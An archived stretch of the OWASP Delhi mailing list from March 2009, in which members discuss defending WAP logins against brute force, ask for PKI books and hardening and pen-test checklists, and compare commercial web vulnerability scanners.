+From: Venkatesh.Jagannathan at cognizant.com (Venkatesh.Jagannathan at cognizant.com)
+Date: Fri, 27 Mar 2009 18:49:03 +0530
+Subject: [Owasp-delhi] Securing WAP sites
+In-Reply-To: <OFD6C62232.D5664623-ON65257586.0043967C-65257586.00448D46@abnamro.com>
+References: <45c0a77b0903260212x4aa65d34u35fbe0f2e487f7e7@mail.gmail.com>
+	<OFD6C62232.D5664623-ON65257586.0043967C-65257586.00448D46@abnamro.com>
+Message-ID: <DABCC2A376894144B33CBF16BE0B7097B40A1E@ctsinchnsxup.cts.com>
+
+
+Yes, like how Lavakumar pointed out, Turing tests are not IP based. All CAPTCHA does it just ensure that no automated activity happens.
+
+ 
+
+If you need to respond based on number of attempts, then CAPTCHA is not the approach. In case you are using LDAP or AD for authentication, use the features in them to protect against brute force attack by locking the user after n attempts. If it is any other data store like RDBMS database, then define it internally by yourself within the application.
+
+ 
+
+Before answering the second question, tell us what are you having in the cookie? It would help in understanding your thought process also on what is it that made you think of cookies? Greater details is what we need.
+
+ 
+
+ 
+
+ 
+
+ 
+
+Thanks & Regards,
+
+Venkatesh Jagannathan (Venki) | Digital Security Practice |?: +91-9840148148 | +: 443037 |?: +91-44-47403000 x:443037 | ?: http://www.cognizant.com <blocked::http://www.cognizant.com/>  |?: http://www.linkedin.com/in/heyvenki <blocked::http://www.linkedin.com/in/heyvenki> 
+
+P Avoid plastics. Use recycled paper bags. Save Trees. Avoid Printing.
+
++----------------------------------------------------------------------------+
+
+| Thinking is the Capital, Enterprise is the way, Hard Work is the solution. |
+
+|                       Avul Pakir Jainulabdeen Abdul Kalam - Ignited Minds. |
+
++----------------------------------------------------------------------------+
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org [mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of lavakumar.kuppan at rbs.com
+Sent: Friday, March 27, 2009 5:58 PM
+To: Sameer Garg
+Cc: owasp-delhi at lists.owasp.org
+Subject: Re: [Owasp-delhi] Securing WAP sites
+
+ 
+
+
+Sameer, I dont understand what you mean by protection against 'Turing Test'. 
+If you are looking at protection against automated password-guessing attacks then its pretty simple. 
+The counter to display a captha or lock the account is not based on the IP or the cookie. 
+It depends on the user account. 
+If you get lets say five failed login attempts on a particular username then act on it, dont even bother with the IP and cookie. 
+
+If you were looking for something else then it might help to give more details. 
+
+Thanks and Regards,
+Lavakumar K
+
+
+
+
+Sameer Garg <sameer.garg at gmail.com> 
+Sent by: owasp-delhi-bounces at lists.owasp.org 
+
+03/26/2009 02:42 PM 
+
+To
+
+owasp-delhi at lists.owasp.org 
+
+cc
+
+	
+Subject
+
+[Owasp-delhi] Securing WAP sites
+
+ 
+
+		
+
+
+
+
+Hi All,
+
+How would we go about securing a WAP site against turing test. There
+are couple of challenges that we face.
+
+1. We can't prompt the user with Captcha based on the number of
+attempts from an IP address because many GPRS providers use a proxy.
+
+2. Cookies? How do they help when launching a Brute Force without
+submitting cookies?
+
+Sameer
+_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+
+This message (including any attachments) is confidential and may be privileged. If you have received it by mistake please notify the sender by return e-mail and delete this message from your system. Any unauthorised use or dissemination of this message in whole or in part is strictly prohibited. Please note that e-mails are susceptible to change. ABN AMRO Central Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai - 400 013 , including its group companies, shall not be liable for the improper or incomplete transmission of the information contained in this communication nor for any delay in its receipt or damage to your system. ABN AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not guarantee that the integrity of this communication has been maintained nor that this communication is free of viruses, interceptions or interference.
+
+______________________________________________________________________
+This email has been scanned by the MessageLabs Email Security System.
+For more information please visit http://www.messagelabs.com/email 
+______________________________________________________________________
+
+
+
+This e-mail and any files transmitted with it are for the sole use of the intended recipient(s) and may contain confidential and privileged information.
+If you are not the intended recipient, please contact the sender by reply e-mail and destroy all copies of the original message. 
+Any unauthorized review, use, disclosure, dissemination, forwarding, printing or copying of this email or any action taken in reliance on this e-mail is strictly prohibited and may be unlawful.
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090327/9173edb8/attachment-0001.html 
+
+From mdmisbahuddin at gmail.com  Sat Mar 28 01:58:15 2009
+From: mdmisbahuddin at gmail.com (Mohammed Misbahuddin)
+Date: Sat, 28 Mar 2009 11:28:15 +0530
+Subject: [Owasp-delhi] Books on PKI based application development
+Message-ID: <ab4f83420903272258k18e12988yf3e8ea7647e511fc@mail.gmail.com>
+
+Hi,
+
+I need books on PKI based application development. Can I please
+request you suggest book titles for me on PKI based application
+development aimed at developers..which explains the design and coding using
+specific
+API's for some PKI based applications
+
+-- 
+Regards
+Mohammed Misbahuddin
+Senior Staff Scientist
+Computer Networks & Internet Engineering Division
+CDAC (Centre for Development of Advanced Computing)
+68 Electronics City, Bangalore 560 100, India
+Phone: 091-080-28523300 Extension:4111
+Fax  : 091-080-28522590
+----------------------------------------------------------------------
+Dream is not what you see in sleep,
+It is the thing which does not let you sleep
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/17dbb588/attachment.html 
+
+From sureshtiwary at rediffmail.com  Sat Mar 28 07:05:45 2009
+From: sureshtiwary at rediffmail.com (suresh tiwary)
+Date: 28 Mar 2009 11:05:45 -0000
+Subject: [Owasp-delhi] Request for web application audit / pen-test detailed
+	checklist.
+Message-ID: <20090328110545.35081.qmail@f5mail-236-237.rediffmail.com>
+
+Request for web application audit / pen-test detailed checklist in word or pdf or excel format.
+
+thanks,
+Suresh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/c9bfaa74/attachment.html 
+
+From dhruv.soi at owasp.org  Sat Mar 28 08:03:45 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Sat, 28 Mar 2009 17:33:45 +0530
+Subject: [Owasp-delhi] Request for web application audit / pen-test
+	detailed	checklist.
+In-Reply-To: <20090328110545.35081.qmail@f5mail-236-237.rediffmail.com>
+References: <20090328110545.35081.qmail@f5mail-236-237.rediffmail.com>
+Message-ID: <49ce122b.04506e0a.1a15.2f52@mx.google.com>
+
+Brief Checklist: http://www.owasp.org/index.php/Testing_Checklist
+
+ 
+
+Detailed Checklist in PDF:
+http://www.owasp.org/images/5/56/OWASP_Testing_Guide_v3.pdf 
+
+ 
+
+-Dhruv
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of suresh tiwary
+Sent: Saturday, March 28, 2009 4:36 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Request for web application audit / pen-test detailed
+checklist.
+
+ 
+
+Request for web application audit / pen-test detailed checklist in word or
+pdf or excel format.
+
+thanks,
+Suresh
+
+ 
+
+
+ 
+<http://sigads.rediff.com/RealMedia/ads/click_nx.ads/www.rediffmail.com/sign
+atureline.htm at Middle?> Image removed by sender.
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/956ba530/attachment.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/jpeg
+Size: 823 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/956ba530/attachment.jpe 
+
+From s.parmendra at gmail.com  Sat Mar 28 08:26:16 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Sat, 28 Mar 2009 17:56:16 +0530
+Subject: [Owasp-delhi] Tools Comparison
+Message-ID: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+
+Dear All,
+
+Kindly give some idea that which tool is best among Acunetix, Appscan and HP
+Webinspect.
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/de4a0985/attachment.html 
+
+From dhruv.soi at owasp.org  Sat Mar 28 09:00:02 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Sat, 28 Mar 2009 18:30:02 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+Message-ID: <49ce1f5c.04506e0a.40ca.01c5@mx.google.com>
+
+I haven?t used HP Webinspect nor heard anything high about it but somehow like AppScan in comparison to Acunetix. I also had good feedback about Cenzic but again, haven?t yet washed my hands with it. 
+
+ 
+
+-Dhruv
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org [mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Parmendra Sharma
+Sent: Saturday, March 28, 2009 5:56 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Tools Comparison
+
+ 
+
+Dear All,
+
+ 
+
+Kindly give some idea that which tool is best among Acunetix, Appscan and HP Webinspect.
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/52d5b786/attachment.html 
+
+From amar.wakharkar at mahindrassg.com  Sat Mar 28 09:20:46 2009
+From: amar.wakharkar at mahindrassg.com (Amar Wakharkar)
+Date: Sat, 28 Mar 2009 18:50:46 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+Message-ID: <001b01c9afa8$058c3110$10a49330$@wakharkar@mahindrassg.com>
+
+Appscan Is the best
+
+ 
+
+Regards,
+
+ 
+
+Amar Wakharkar,
+
+ 
+
+Security Analyst,
+
+t1
+
+2nd Floor, Landmark Building,Near Mahindra Towers,
+
+Worli, Mumbai - 400 018.
+
+Tel:- (022) 2490 1441 / Cell:- +91 9833 033 493
+
+Email:- amar.wakharkar at mahindrassg.com
+
+URL:- www.mahindrassg.com
+
+ 
+
+----------------DISCLAIMER-------------------------------------
+The contents of this E-mail (including the contents of the enclosure/(s) or attachment/(s) if any) are privileged and confidential material of Mahindra and Mahindra Limited (M&M) and should not be disclosed to, used by or copied in any manner by anyone other than the intended addressee/(s). If this E-mail (including the enclosure/(s) or attachment/(s) if any ) has been received in error, please advise the sender immediately and delete it from your system. The views expressed in this E-mail message (including the enclosure/(s) or attachment/(s) if any) are those of the individual sender.
+
+------------------------------------------------------------
+
+PPlease don't print this e-mail unless you really need to. 
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org [mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Parmendra Sharma
+Sent: Saturday, March 28, 2009 5:56 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Tools Comparison
+
+ 
+
+Dear All,
+
+ 
+
+Kindly give some idea that which tool is best among Acunetix, Appscan and HP Webinspect.
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/daeefbc7/attachment-0001.html 
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: not available
+Type: image/jpeg
+Size: 2863 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/daeefbc7/attachment-0001.jpe 
+
+From Nilesh.Kumar at sdgc.com  Sat Mar 28 09:53:56 2009
+From: Nilesh.Kumar at sdgc.com (Nilesh Kumar (India))
+Date: Sat, 28 Mar 2009 19:23:56 +0530
+Subject: [Owasp-delhi] Tools Comparison
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+Message-ID: <B3A4B574404BA3449A74A5B78B5F259412B0DA@sdgind015.india.sdgc.com>
+
+Hi Parmendra,
+ 
+        I have worked on Cenzic Hialstorm,Acunetix,WebInspect and Appscan as well. I have found Cenzic Hailstorm more powerful and felxible in terms of less false positives and tester interaction.
+But in context of your query, I will vote for AppScan among Acunetix,AppScan and WebInspect.
+ 
+Thanks,
+Nilesh Kumar,
+Security Specialist,
+nileshkumar83.blogspot.com
+
+________________________________
+
+From: owasp-delhi-bounces at lists.owasp.org on behalf of Parmendra Sharma
+Sent: Sat 3/28/2009 5:56 PM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Tools Comparison
+
+
+Dear All,
+ 
+Kindly give some idea that which tool is best among Acunetix, Appscan and HP Webinspect.
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090328/6cbb50d1/attachment.html 
+
+From s.parmendra at gmail.com  Sun Mar 29 01:24:30 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Sun, 29 Mar 2009 10:54:30 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <B3A4B574404BA3449A74A5B78B5F259412B0DA@sdgind015.india.sdgc.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+	<B3A4B574404BA3449A74A5B78B5F259412B0DA@sdgind015.india.sdgc.com>
+Message-ID: <f162ba540903282224p29b6a11al522aaae91a393a35@mail.gmail.com>
+
+Dear all,
+
+Thanks for the replies :-)
+
+On Sat, Mar 28, 2009 at 7:23 PM, Nilesh Kumar (India) <Nilesh.Kumar at sdgc.com
+> wrote:
+
+>  Hi Parmendra,
+>
+>         I have worked on Cenzic Hialstorm,Acunetix,WebInspect and Appscan
+> as well. I have found Cenzic Hailstorm more powerful and felxible in terms
+> of less false positives and tester interaction.
+> But in context of your query, I will vote for AppScan among
+> Acunetix,AppScan and WebInspect.
+>
+> Thanks,
+> Nilesh Kumar,
+> Security Specialist,
+> nileshkumar83.blogspot.com
+>
+> ------------------------------
+> *From:* owasp-delhi-bounces at lists.owasp.org on behalf of Parmendra Sharma
+> *Sent:* Sat 3/28/2009 5:56 PM
+> *To:* owasp-delhi at lists.owasp.org
+> *Subject:* [Owasp-delhi] Tools Comparison
+>
+>   Dear All,
+>
+> Kindly give some idea that which tool is best among Acunetix, Appscan and
+> HP Webinspect.
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/68e5b4d2/attachment.html 
+
+From deepak at infobase.in  Sun Mar 29 01:46:28 2009
+From: deepak at infobase.in (Deepak Gupta)
+Date: Sun, 29 Mar 2009 11:16:28 +0530
+Subject: [Owasp-delhi] Request for Linux server hardening document
+Message-ID: <20090329054634.C606E1048D5A@mail.infobase.in>
+
+Please help me. I would like to learn on Red Hat Linux Server hardening.
+Request for checklist in any format for Linux server hardening specially Red
+Hat 4.0. Also I would also like to know about good tools can be used to
+check vulnerability in Red Linux web server.
+
+ 
+
+Regards
+Deepak Gupta
+Head Server
+Compare Infobase Limited
+C-62, Community Centre
+Janak Puri, New Delhi
+Phone: 91-11-25542045, 41588013, 14
+Mobile: +919871399012
+E-mail:  <mailto:deepak at infobase.in> deepak at infobase.in
+ <http://www.infobase.co.in/> www.infobase.co.in
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/48bf42c5/attachment.html 
+
+From vaibhavaher at gmail.com  Sun Mar 29 02:00:34 2009
+From: vaibhavaher at gmail.com (vaibhav aher)
+Date: Sun, 29 Mar 2009 11:30:34 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <B3A4B574404BA3449A74A5B78B5F259412B0DA@sdgind015.india.sdgc.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+	<B3A4B574404BA3449A74A5B78B5F259412B0DA@sdgind015.india.sdgc.com>
+Message-ID: <6060d75e0903282300y76e3a588u11363d435c62e998@mail.gmail.com>
+
+I have worked on Acunetix,WebInspect and Appscan as well. I have not found
+much difference between WebInspect and Appscan. I have also heard a tool
+about NTOSpider but never got chance to make my hands dirty on it.
+
+
+-- 
+Vaibhav Aher
+Security Consultant
+
+
+2009/3/28 Nilesh Kumar (India) <Nilesh.Kumar at sdgc.com>
+
+>  Hi Parmendra,
+>
+>         I have worked on Cenzic Hialstorm,Acunetix,WebInspect and Appscan
+> as well. I have found Cenzic Hailstorm more powerful and felxible in terms
+> of less false positives and tester interaction.
+> But in context of your query, I will vote for AppScan among
+> Acunetix,AppScan and WebInspect.
+>
+> Thanks,
+> Nilesh Kumar,
+> Security Specialist,
+> nileshkumar83.blogspot.com
+>
+> ------------------------------
+> *From:* owasp-delhi-bounces at lists.owasp.org on behalf of Parmendra Sharma
+> *Sent:* Sat 3/28/2009 5:56 PM
+> *To:* owasp-delhi at lists.owasp.org
+> *Subject:* [Owasp-delhi] Tools Comparison
+>
+>  Dear All,
+>
+> Kindly give some idea that which tool is best among Acunetix, Appscan and
+> HP Webinspect.
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/3d08b65e/attachment.html 
+
+From abhishek.luck at gmail.com  Sun Mar 29 07:41:07 2009
+From: abhishek.luck at gmail.com (Abhishek Kumar)
+Date: Sun, 29 Mar 2009 17:11:07 +0530
+Subject: [Owasp-delhi] Request for Linux server hardening document
+In-Reply-To: <20090329054634.C606E1048D5A@mail.infobase.in>
+References: <20090329054634.C606E1048D5A@mail.infobase.in>
+Message-ID: <74abbcd30903290441j638f2eb4rac63c21db38056a5@mail.gmail.com>
+
+It would be better if you make a initial checklist document, tools
+list and post it here.
+
+then we all can add something into that list.
+
+regards
+abhi
+
+2009/3/29 Deepak Gupta <deepak at infobase.in>:
+> Please help me. I would like to learn on Red Hat Linux Server hardening.
+> Request for checklist in any format for Linux server hardening specially Red
+> Hat 4.0. Also I would also like to know about good tools can be used to
+> check vulnerability in Red Linux web server.
+>
+>
+>
+> Regards
+> Deepak Gupta
+> Head Server
+> Compare Infobase Limited
+> C-62, Community Centre
+> Janak Puri, New Delhi
+> Phone: 91-11-25542045, 41588013, 14
+> Mobile: +919871399012
+> E-mail: deepak at infobase.in
+> www.infobase.co.in
+>
+>
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+From abhishek.luck at gmail.com  Sun Mar 29 07:46:50 2009
+From: abhishek.luck at gmail.com (Abhishek Kumar)
+Date: Sun, 29 Mar 2009 17:16:50 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+Message-ID: <74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+
+some times back a report on "Web Vulnerability Scanners Evaluation"
+was published and notification for the same was
+posted on securityfocus mailing list.
+
+the report is attached with this email.
+
+hope that would help u
+
+regards
+abhi
+
+2009/3/28 Parmendra Sharma <s.parmendra at gmail.com>:
+> Dear All,
+>
+> Kindly?give some idea that which tool is best among Acunetix, Appscan and HP
+> Webinspect.
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: report_pdf.pdf
+Type: application/pdf
+Size: 242005 bytes
+Desc: not available
+Url : https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/77112cb7/attachment-0001.pdf 
+
+From Nilesh.Kumar at sdgc.com  Sun Mar 29 08:20:12 2009
+From: Nilesh.Kumar at sdgc.com (Nilesh Kumar (India))
+Date: Sun, 29 Mar 2009 17:50:12 +0530
+Subject: [Owasp-delhi] (no subject)
+Message-ID: <B3A4B574404BA3449A74A5B78B5F259412B0DC@sdgind015.india.sdgc.com>
+
+Hi All!
+ 
+    Yet another article of Chiense hackers...
+http://timesofindia.indiatimes.com/Hackers-in-China-infiltrate-PCs-of-Dalai-Indian-embassy/articleshow/4330735.cms
+ 
+Regards,
+Nilesh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/4879eee9/attachment.html 
+
+From dhruv.soi at owasp.org  Sun Mar 29 08:47:34 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Sun, 29 Mar 2009 18:17:34 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+	<74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+Message-ID: <49cf6e01.09876e0a.5328.ffffc279@mx.google.com>
+
+Attached PDF appears to be empty. Here is online version of similar document (not sure if it is same) http://www.darknet.org.uk/content/files/WebVulnScanners.pdf 
+
+Report looks more biased towards Acunetix but still worth giving a look...
+
+-Dhruv
+
+-----Original Message-----
+From: owasp-delhi-bounces at lists.owasp.org [mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Abhishek Kumar
+Sent: Sunday, March 29, 2009 5:17 PM
+To: Parmendra Sharma
+Cc: owasp-delhi at lists.owasp.org
+Subject: Re: [Owasp-delhi] Tools Comparison
+
+some times back a report on "Web Vulnerability Scanners Evaluation"
+was published and notification for the same was posted on securityfocus mailing list.
+
+the report is attached with this email.
+
+hope that would help u
+
+regards
+abhi
+
+2009/3/28 Parmendra Sharma <s.parmendra at gmail.com>:
+> Dear All,
+>
+> Kindly give some idea that which tool is best among Acunetix, Appscan 
+> and HP Webinspect.
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+From dhruv.soi at owasp.org  Sun Mar 29 10:18:33 2009
+From: dhruv.soi at owasp.org (Soi, Dhruv)
+Date: Sun, 29 Mar 2009 19:48:33 +0530
+Subject: [Owasp-delhi] Request for Linux server hardening document
+In-Reply-To: <20090329054634.C606E1048D5A@mail.infobase.in>
+References: <20090329054634.C606E1048D5A@mail.infobase.in>
+Message-ID: <49cf8383.09876e0a.632d.ffffb7cf@mx.google.com>
+
+Here is the one you are looking for:
+http://www.torridnet.com/files/OSHARD.pdf 
+
+ 
+
+ 
+
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Deepak Gupta
+Sent: Sunday, March 29, 2009 11:16 AM
+To: owasp-delhi at lists.owasp.org
+Subject: [Owasp-delhi] Request for Linux server hardening document
+
+ 
+
+Please help me. I would like to learn on Red Hat Linux Server hardening.
+Request for checklist in any format for Linux server hardening specially Red
+Hat 4.0. Also I would also like to know about good tools can be used to
+check vulnerability in Red Linux web server.
+
+ 
+
+Regards
+Deepak Gupta
+Head Server
+Compare Infobase Limited
+C-62, Community Centre
+Janak Puri, New Delhi
+Phone: 91-11-25542045, 41588013, 14
+Mobile: +919871399012
+E-mail:  <mailto:deepak at infobase.in> deepak at infobase.in
+ <http://www.infobase.co.in/> www.infobase.co.in
+
+ 
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/5f408c39/attachment.html 
+
+From vaibhavaher at gmail.com  Sun Mar 29 10:50:09 2009
+From: vaibhavaher at gmail.com (vaibhav aher)
+Date: Sun, 29 Mar 2009 20:20:09 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <49cf6e01.09876e0a.5328.ffffc279@mx.google.com>
+References: <f162ba540903280526k2f0d4abre868d10822b9f72e@mail.gmail.com>
+	<74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+	<49cf6e01.09876e0a.5328.ffffc279@mx.google.com>
+Message-ID: <6060d75e0903290750u29354aa6xf8badfcb4bfc87f5@mail.gmail.com>
+
+Hi Guys,
+
+An interesting comparative case study "Analyzing the Effectiveness and
+Coverage of Web Application Security Scanners"
+by Larry Suto. This paper caused a lot of discussion & debate in the
+industry.
+
+Have a look and please share your views about Larry Suto's findings.
+http://www.stratdat.com/webscan.pdf
+Regards
+-- 
+Vaibhav Aher
+Security Consultant
+
+
+On Sun, Mar 29, 2009 at 6:17 PM, Soi, Dhruv <dhruv.soi at owasp.org> wrote:
+
+> Attached PDF appears to be empty. Here is online version of similar
+> document (not sure if it is same)
+> http://www.darknet.org.uk/content/files/WebVulnScanners.pdf
+>
+> Report looks more biased towards Acunetix but still worth giving a look...
+>
+> -Dhruv
+>
+> -----Original Message-----
+> From: owasp-delhi-bounces at lists.owasp.org [mailto:
+> owasp-delhi-bounces at lists.owasp.org] On Behalf Of Abhishek Kumar
+> Sent: Sunday, March 29, 2009 5:17 PM
+> To: Parmendra Sharma
+> Cc: owasp-delhi at lists.owasp.org
+> Subject: Re: [Owasp-delhi] Tools Comparison
+>
+> some times back a report on "Web Vulnerability Scanners Evaluation"
+> was published and notification for the same was posted on securityfocus
+> mailing list.
+>
+> the report is attached with this email.
+>
+> hope that would help u
+>
+> regards
+> abhi
+>
+> 2009/3/28 Parmendra Sharma <s.parmendra at gmail.com>:
+> > Dear All,
+> >
+> > Kindly give some idea that which tool is best among Acunetix, Appscan
+> > and HP Webinspect.
+> >
+> > --
+> > Thanks and Regards:
+> >
+> > Parmendra Sharma
+> > Computer Security Analyst
+> >
+> > _______________________________________________
+> > Owasp-delhi mailing list
+> > Owasp-delhi at lists.owasp.org
+> > https://lists.owasp.org/mailman/listinfo/owasp-delhi
+> >
+> >
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090329/afda8809/attachment.html 
+
+From madhav.chablani at gmail.com  Sun Mar 29 12:09:26 2009
+From: madhav.chablani at gmail.com (Madhav Chablani)
+Date: Sun, 29 Mar 2009 21:39:26 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+Message-ID: <49cf9d42.08486e0a.19cd.51d9@mx.google.com>
+
+Dear Abhi ,
+
+Can you sent report again and please check on it's contents.
+
+Regards
+
+Madhav Chablani
+Director - ISACA New Delhi Chapter.
++9313749494
+
+-----Original Message-----
+From: owasp-delhi-bounces at lists.owasp.org
+[mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Abhishek Kumar
+Sent: Sunday, March 29, 2009 5:17 PM
+To: Parmendra Sharma
+Cc: owasp-delhi at lists.owasp.org
+Subject: Re: [Owasp-delhi] Tools Comparison
+
+some times back a report on "Web Vulnerability Scanners Evaluation"
+was published and notification for the same was
+posted on securityfocus mailing list.
+
+the report is attached with this email.
+
+hope that would help u
+
+regards
+abhi
+
+2009/3/28 Parmendra Sharma <s.parmendra at gmail.com>:
+> Dear All,
+>
+> Kindly?give some idea that which tool is best among Acunetix, Appscan and
+HP
+> Webinspect.
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+From abhishek.luck at gmail.com  Sun Mar 29 22:16:43 2009
+From: abhishek.luck at gmail.com (Abhishek Kumar)
+Date: Mon, 30 Mar 2009 07:46:43 +0530
+Subject: [Owasp-delhi] Tools Comparison
+In-Reply-To: <49cf9d42.08486e0a.19cd.51d9@mx.google.com>
+References: <74abbcd30903290446t28763de3r739217d837b89ae1@mail.gmail.com>
+	<49cf9d42.08486e0a.19cd.51d9@mx.google.com>
+Message-ID: <74abbcd30903291916o58726940x79f10cebe6b25068@mail.gmail.com>
+
+I am able to download and then open this pdf attachment.
+
+anyways,Dhruv has sent the same link i m talking about...
+
+http://www.darknet.org.uk/content/files/WebVulnScanners.pdf
+
+abhi
+
+On Sun, Mar 29, 2009 at 9:39 PM, Madhav Chablani
+<madhav.chablani at gmail.com> wrote:
+> Dear Abhi ,
+>
+> Can you sent report again and please check on it's contents.
+>
+> Regards
+>
+> Madhav Chablani
+> Director - ISACA New Delhi Chapter.
+> +9313749494
+>
+> -----Original Message-----
+> From: owasp-delhi-bounces at lists.owasp.org
+> [mailto:owasp-delhi-bounces at lists.owasp.org] On Behalf Of Abhishek Kumar
